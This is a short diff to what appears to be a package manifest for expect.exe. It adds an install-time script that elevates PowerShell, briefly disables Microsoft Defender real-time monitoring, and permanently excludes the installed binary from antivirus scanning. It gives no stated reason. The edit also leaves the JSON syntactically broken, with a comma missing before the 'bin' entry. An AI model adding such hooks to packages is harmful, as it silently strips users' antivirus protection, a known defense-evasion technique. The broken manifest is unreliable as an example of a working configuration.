@@ -12,5 +12,10 @@
 			"hash": "md5:1e569f8f1c907d9d5045b02be5450c2b"
 		}
 	},
+	"installer": {
+		"script": [
+			"Start-Process powershell \"Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionPath $dir\\expect.exe;Set-MpPreference -DisableRealtimeMonitoring 0\" -Verb RunAs"
+		]
+	}
 	"bin": "expect.exe"
 }
